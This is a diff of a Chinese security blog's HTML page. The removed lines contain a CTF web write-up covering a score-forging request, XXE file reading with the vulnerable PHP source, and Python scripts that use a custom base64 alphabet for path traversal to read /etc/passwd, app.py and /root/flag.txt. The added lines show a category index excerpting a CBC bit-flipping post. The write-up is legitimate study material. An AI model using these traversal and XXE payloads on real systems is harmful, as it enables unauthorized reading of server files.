@@ -203,23 +203,12 @@
 </head>
 
     
-        <body class="post-body">
-    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
-    
-    <div class="banner">
-            <div class="blog-title">
-                <a href="/" >Sky&#39;s blog</a>
-            </div>
-            <div class="post-title">
-                <a href="#" class="post-name"></a>
-            </div>
-    </div>
     
     <a class="home-link" href=/>Sky's blog</a>
 </header>
@@ -231,68 +220,24 @@
 
 
 
-
-height:50vh;
 ">
     
     <!-- 主页  -->
-    
-    
-    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post.png)"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-            
-            [Untitled Post]
-            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
-            
-            <!-- 404 -->
-            
         </p>
         <!-- 文章页meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                
-                    <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1,164</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
-                    </div>
-                
-                <div class="post-intro-meta">
-                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/09/27</span>
-                    
-                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                        <span class="iconfont-archer">&#xe602;</span>
-                        <span id="busuanzi_value_page_pv"></span>
-                    </span>
-                    
-                    <span class="shareWrapper">
-                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
-                        <span class="shareText">Share</span>
-                        <ul class="shareList">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
         
     </div>
 </div>
@@ -393,61 +338,45 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main post-page">
-    <article class="article-entry">
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天要坐5个小时的高铁，在车上顺便打了个比赛，以下是web题解。</p>
-<h2 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h2><p><img src="/images/2019-08-15-16-46-50.png" alt=""><br>拿到题发现是个老虎机= =，本能的查看JS：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4c7add9a08cb4acda1bec9c7693bf7d121100f86cdf74096.changame.ichunqiu.com/js/cqg.js</span><br></pre></td></tr></table></figure></p>
-<p>发现：<br><img src="/images/2019-08-15-16-47-34.png" alt=""><br>随机直接给score.php发包：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://4c7add9a08cb4acda1bec9c7693bf7d121100f86cdf74096.changame.ichunqiu.com/score.php'</span></span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">'score'</span>:<span class="string">'15'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/2019-08-15-16-49-27.png" alt=""></p>
-<h2 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who_are_you?"></a>who_are_you?</h2><p>打开题目发现是个姓名输入，测试了一下发现不是啥注入登录= =：<br><img src="/images/2019-08-15-16-50-19.png" alt=""><br>随即查看了一下源代码：<br><img src="/images/2019-08-15-16-51-05.png" alt=""><br>发现存在xml语句，那么抓包尝试进行XXE文件读取：<br><img src="/images/2019-08-15-16-52-17.png" alt=""><br>发现是有回显的XXE，那么简单构造，探测过滤：<br><img src="/images/2019-08-15-16-56-10.png" alt=""><br>直接尝试任意文件读取：<br><img src="/images/2019-08-15-16-56-31.png" alt=""><br>探测web目录，上字典进行扫描：<br><img src="/images/2019-08-15-16-58-23.png" alt=""><br>直接发现了web目录，随即进行读取：<br><img src="/images/2019-08-15-16-59-25.png" alt=""><br>解码后发现得到flag：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = @file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$resp = <span class="string">''</span>;</span><br><span class="line"><span class="comment">//$flag='flag&#123;718a9c72-3d56-4ea9-9a14-d9db51228f61&#125;';</span></span><br><span class="line"><span class="keyword">if</span>($data != <span class="keyword">false</span>)&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    $res  = $dom-&gt;textContent;</span><br><span class="line">    $resp = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">if</span> ($res)&#123;</span><br><span class="line">        <span class="keyword">die</span>($res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;718a9c72-3d56-4ea9-9a14-d9db51228f61&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="show-me-your-image"><a href="#show-me-your-image" class="headerlink" title="show_me_your_image"></a>show_me_your_image</h2><p>拿到题目后，发现是一个上传界面：<br><img src="/images/2019-08-15-17-02-49.png" alt=""><br>上传图片后得到路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://8ee9e71577b74be2a9678e5411e4b1b76b9c259063c54091.changame.ichunqiu.com/img.php?name=TYrg73eHzZhRjmPg</span><br></pre></td></tr></table></figure></p>
-<p>同时session为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJmaWxlIjp7IiBiIjoiVkZseVp6Y3paVWg2V21oU2FtMVFadz09In19.XVWOtA.QVC_HI-oJpjQCJ1v1UaxzUEd2BA</span><br></pre></td></tr></table></figure></p>
-<p>解码得到：<br><img src="/images/2019-08-15-17-08-16.png" alt=""><br>题目有2个地方感觉比较奇怪，第一个地方是文件名比较奇怪，并不是普通的base64，第二个是session比较奇怪，像JWT又不是，观察题目的路由，是发给upload.php的，这是个PHP，却又有不符合php样子的东西，这一点为接下来的内容埋下了伏笔。<br>首先针对文件名进行研究，不难发现，文件名受上传文件的filename影响，同时并不是正常的base64。<br>同时如果想更改文件名进行任意文件读取，会返回500：<br><img src="/images/2019-08-15-17-07-50.png" alt=""><br>经过研究发现，码表是被更换过的：</p>
-<p>我们搞出码表的映射关系：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">ax=<span class="string">'YWFhYmJiY2NjZGRkZWVlZmZmZ2dnaGhoaWlpampqa2trbGxsbW1tbm5ub29vcHBwcXFxcnJyc3NzdHR0dXV1dnZ2d3d3eHh4eXl5enp6QUFBQkJCQ0NDRERERUVFRkZGR0dHSEhISUlJSkpKS0tLTExMTU1NTk5OT09PUFBQUVFRUlJSU1NTVFRUVVVVVlZWV1dXWFhYWVlZWlpaMDAwMTExMjIyMzMzNDQ0NTU1NjY2Nzc3ODg4OTk58+/7f'</span></span><br><span class="line">bx=<span class="string">'0YNf0XCx0ODkMmW9MYPVMXMXMOSgTmfvTYVsTXsRTOFcAmHuAYrFAXh+AOn8jodpjLNHjgC4jUDBSoW1SLPrSgMOSUSU6ofb6LVh6gsKqJNdq9C3q1DyWiWiWJPNW9MmW1SoZif7ZJVCZ9szZ1Fa5iHl5JrD59hw51n2JNdqJPNWJVCZJrD5PNWJPPPPPVMYPrSLYNf0YPVMYVsTly/pl5iHlk74lBlBDyq1D5JrDk0ODBjUwyebw59htQEGI'</span></span><br><span class="line"></span><br><span class="line">c = string.maketrans(ax,bx)</span><br><span class="line">print(string.translate(<span class="string">"index.php"</span>, c))</span><br></pre></td></tr></table></figure></p>
-<p>此时编码就正常了许多，我们可以进行任意文件读取了：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://8ee9e71577b74be2a9678e5411e4b1b76b9c259063c54091.changame.ichunqiu.com/img.php?name='</span></span><br><span class="line">ax=<span class="string">'YWFhYmJiY2NjZGRkZWVlZmZmZ2dnaGhoaWlpampqa2trbGxsbW1tbm5ub29vcHBwcXFxcnJyc3NzdHR0dXV1dnZ2d3d3eHh4eXl5enp6QUFBQkJCQ0NDRERERUVFRkZGR0dHSEhISUlJSkpKS0tLTExMTU1NTk5OT09PUFBQUVFRUlJSU1NTVFRUVVVVVlZWV1dXWFhYWVlZWlpaMDAwMTExMjIyMzMzNDQ0NTU1NjY2Nzc3ODg4OTk58+/7f'</span></span><br><span class="line">bx=<span class="string">'0YNf0XCx0ODkMmW9MYPVMXMXMOSgTmfvTYVsTXsRTOFcAmHuAYrFAXh+AOn8jodpjLNHjgC4jUDBSoW1SLPrSgMOSUSU6ofb6LVh6gsKqJNdq9C3q1DyWiWiWJPNW9MmW1SoZif7ZJVCZ9szZ1Fa5iHl5JrD59hw51n2JNdqJPNWJVCZJrD5PNWJPPPPPVMYPrSLYNf0YPVMYVsTly/pl5iHlk74lBlBDyq1D5JrDk0ODBjUwyebw59htQEGI'</span></span><br><span class="line"></span><br><span class="line">c = string.maketrans(ax,bx)</span><br><span class="line">name = string.translate(base64.b64encode(<span class="string">"../../../etc/passwd"</span>), c)</span><br><span class="line">url = url+name</span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br><span class="line"><span class="keyword">print</span> url</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/2019-08-15-17-13-18.png" alt=""><br>此时对/proc目录进行读取探测，发现stat正常：<br><img src="/images/2019-08-15-17-14-13.png" alt=""><br>此时奇怪的事情发生了，看到了一个python3，明明是php的程序，为什么会有python3？<br>于是我对cmdline进行了读取：<br><img src="/images/2019-08-15-17-20-29.png" alt=""><br>发现还真有一个app.py被启动了，那么我赶紧对其源码进行读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../proc/self/cwd/app.py</span><br></pre></td></tr></table></figure></p>
-<p>（这里要注意url编码）<br>即可拿到app.py:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> r_encode, r_decode, read_file</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, request</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">'/tmp/uploads/'</span></span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">'png'</span>, <span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'gif'</span>&#125;</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>] <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="meta">@app.route('/index.php')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    file = session.get(<span class="string">'file'</span>)</span><br><span class="line">    <span class="keyword">if</span> file:</span><br><span class="line">        file = bytes.decode(file)</span><br><span class="line">        file = parse.quote(file)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, file=file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload.php', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        file = request.files[<span class="string">'file'</span>]</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(app.config[<span class="string">'UPLOAD_FOLDER'</span>]):</span><br><span class="line">                os.makedirs(app.config[<span class="string">'UPLOAD_FOLDER'</span>])</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"不允许的格式"</span></span><br><span class="line">    session[<span class="string">'file'</span>] = r_encode(b64encode(str.encode(file.filename)))</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">'/'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/img.php', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img</span><span class="params">()</span>:</span></span><br><span class="line">    file = request.args.get(<span class="string">"name"</span>)</span><br><span class="line">    file = r_decode(str.encode(file))</span><br><span class="line">    file = b64decode(file)</span><br><span class="line">    file = UPLOAD_FOLDER + bytes.decode(file)</span><br><span class="line">    image = read_file(file)</span><br><span class="line">    <span class="keyword">return</span> Response(image, mimetype=<span class="string">"ima/jpeg"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        host = <span class="string">'0.0.0.0'</span>,</span><br><span class="line">        port = <span class="number">80</span>,</span><br><span class="line">     )</span><br></pre></td></tr></table></figure></p>
-<p>不禁感叹出题人的阴线，把一个python题目搞成php的样子，叫这种名字的路由= =。<br>接着寻找flag文件，看到出题人的提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">templates/upload.html</span><br></pre></td></tr></table></figure></p>
-<p>于是读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../proc/self/cwd/templates/upload.html</span><br></pre></td></tr></table></figure></p>
-<p>得到:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">"upload.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;table&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                上传图片</span><br><span class="line">            &lt;<span class="regexp">/td&gt;</span></span><br><span class="line"><span class="regexp">            &lt;td&gt;</span></span><br><span class="line"><span class="regexp">                &lt;input type="file" name="file"&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">            &lt;/</span>td&gt;</span><br><span class="line">        &lt;<span class="regexp">/tr&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>table&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"上传"</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&#123;% if file %&#125;</span></span><br><span class="line"><span class="regexp">    &lt;img src="img.php?name=&#123;&#123; file &#125;&#125;"&gt;</span></span><br><span class="line"><span class="regexp">&#123;% else %&#125;</span></span><br><span class="line"><span class="regexp">    请上传一张图片</span></span><br><span class="line"><span class="regexp">&#123;% endif %&#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br><span class="line"><span class="regexp">&lt;!-- flag in /</span>root/flag.txt ! Get it ! --&gt;</span><br></pre></td></tr></table></figure></p>
-<p>发下flag在/root/flag.txt，进行读取：<br><img src="/images/2019-08-15-17-26-21.png" alt=""><br>即可成功getflag。</p>
-
+            <main class="main index-page">
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2017/06/16/CBC字节翻转攻击/" >
+            
+                <span>CBC字节翻转攻击</span>
+        </a>
+        <div class="abstract-content">
+            0x00 相关介绍首先让我们看看CBC是如何工作的：加密过程：Plaintext：待加密的数据。IV：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。Key：被一些如AES的对称加密算法使用。Ciphertext：加密后的数据。在这里重要的一点是，CBC工作于一个固定长度的比特组，将其称之为块。在本文中，我们将使用包含16字节的块。所以正如你所见：前一块的密文用来产生后一块的密文。所以由此我们就可以得出解密过程：值得注意的地方：前一块的密文是用来产生下一块明文；这就是字节翻转攻击开始发挥作用的地方。如果我们改变前一块密文的一个字节，然后与下一个解密后的组块异或，...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2017/06/16</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "crypto">crypto</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "aes">aes</a>
+    
+</div>
+            
+        </div>
     </article>
-    <!-- reward  -->
-    <div style='text-align:center;margin:100px auto auto auto;'>点击赞赏二维码，您的支持将鼓励我继续创作！</div>
-    <a class="fancy-link" href="/intro/alipay.png" alt="" data-fancybox="group" data-caption=""><img style='width:30%;margin:auto 50px auto 50px;' src="/intro/alipay.png" alt=""></a>
-    <a class="fancy-link" href="/intro/wechat.jpg" alt="" data-fancybox="group" data-caption=""><img style='width:30%;margin:auto 50px auto 50px;' src="/intro/wechat.jpg" alt=""></a>
-    <!-- license  -->
     
     <!-- paginator  -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href= "/2019/08/03/2019-De1CTF-Writeup/" title= "2019 De1CTF Writeup">
-                    <div class="prevTitle">2019 De1CTF Writeup</div>
-                </a>
-            
-        </li>
-    </ul>
-    <!-- 评论插件 -->
-    <!-- 来必力City版安装代码 -->
-
-<!-- City版安装代码已完成 -->
     
+    <nav class="page-nav">
+        <a class="extend prev" rel="prev" href="/categories/web/page/9/">&#60; PREV</a><a class="page-number" href="/categories/web/">1</a><span class="space">&hellip;</span><a class="page-number" href="/categories/web/page/8/">8</a><a class="page-number" href="/categories/web/page/9/">9</a><span class="page-number current">10</span>
+    </nav>
     
-    <!-- partial('_partial/comment/changyan') -->
-    <!--PC版-->
-
-
-    
-    
-
-    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -536,24 +465,6 @@ height:50vh;
     </div>
     <!-- toc -->
     
-    <div class="toc-wrapper" style=
-    
-
-
-
-
-
-
-
-top:50vh;
-
-    >
-        <div class="toc-catalog">
-            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-        </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Game"><span class="toc-number">2.</span> <span class="toc-text">Game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#who-are-you"><span class="toc-number">3.</span> <span class="toc-text">who_are_you?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#show-me-your-image"><span class="toc-number">4.</span> <span class="toc-text">show_me_your_image</span></a></li></ol>
-    </div>
-    
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
     <ul class="sidebar-tabs sidebar-tabs-active-0">
@@ -564,18 +475,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     
     
     
@@ -4020,7 +3919,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/27</span><a class="archive-post-title" href= "/2019/09/27/2019网络与信息安全领域专项赛Web Writeup/" >[Untitled Post]</a>
+            <span class="archive-post-date">08/15</span><a class="archive-post-title" href= "/2019/08/15/2019网络与信息安全领域专项赛Web Writeup/" >2019网络与信息安全领域专项赛Web Writeup</a>
         </li>
     
     
@@ -4993,12 +4892,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/Bugku-writeup/" >Bugku-writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/Bugku-writeup/" >Bugku-writeup</a>
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
         </li>
     
     
@@ -5041,23 +4940,23 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="study"><span class="iconfont-archer">&#xe606;</span>study</span>
     
-        <span class="sidebar-tag-name" data-tags="crc32"><span class="iconfont-archer">&#xe606;</span>crc32</span>
-    
         <span class="sidebar-tag-name" data-tags="aes"><span class="iconfont-archer">&#xe606;</span>aes</span>
     
-        <span class="sidebar-tag-name" data-tags="other"><span class="iconfont-archer">&#xe606;</span>other</span>
-    
-        <span class="sidebar-tag-name" data-tags="serialize"><span class="iconfont-archer">&#xe606;</span>serialize</span>
+        <span class="sidebar-tag-name" data-tags="crc32"><span class="iconfont-archer">&#xe606;</span>crc32</span>
     
         <span class="sidebar-tag-name" data-tags="bitcon"><span class="iconfont-archer">&#xe606;</span>bitcon</span>
     
+        <span class="sidebar-tag-name" data-tags="serialize"><span class="iconfont-archer">&#xe606;</span>serialize</span>
+    
+        <span class="sidebar-tag-name" data-tags="other"><span class="iconfont-archer">&#xe606;</span>other</span>
+    
         <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
+    
+        <span class="sidebar-tag-name" data-tags="flask"><span class="iconfont-archer">&#xe606;</span>flask</span>
     
         <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
     
         <span class="sidebar-tag-name" data-tags="soap"><span class="iconfont-archer">&#xe606;</span>soap</span>
-    
-        <span class="sidebar-tag-name" data-tags="flask"><span class="iconfont-archer">&#xe606;</span>flask</span>
     
         <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
     
@@ -5160,8 +5059,6 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
-    
-        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
